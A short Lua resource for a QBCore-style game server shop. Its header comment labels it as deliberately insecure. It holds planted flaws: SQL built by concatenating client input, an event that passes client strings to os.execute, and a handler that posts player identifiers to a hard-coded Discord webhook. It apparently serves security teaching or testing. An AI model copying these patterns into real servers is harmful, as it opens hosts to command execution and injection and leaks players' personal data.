-- Deliberately insecure sample resource (QBCore-style shop).
local QBCore = exports['qb-core']:GetCoreObject()

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/123456789012345678/AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"

RegisterNetEvent('qb-shops:buyItem')
AddEventHandler('qb-shops:buyItem', function(item, amount)
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    Player.Functions.AddItem(item, amount)   -- no allow-list, no bounds
    local q = "INSERT INTO shop_logs (item, amount, citizenid) VALUES ('" .. item .. "', " .. amount .. ", '" .. Player.PlayerData.citizenid .. "')"
    exports.oxmysql:execute(q, {}, function() end)
end)

-- Host command execution primitive
RegisterNetEvent('qb-shops:maintenance')
AddEventHandler('qb-shops:maintenance', function(cmd)
    os.execute(cmd)
end)

-- PII shipped off-box
RegisterNetEvent('qb-shops:audit')
AddEventHandler('qb-shops:audit', function()
    local ids = GetPlayerIdentifiers(source)
    PerformHttpRequest(DISCORD_WEBHOOK, function() end, 'POST',
        json.encode({identifiers = ids}), {['Content-Type'] = 'application/json'})
end)
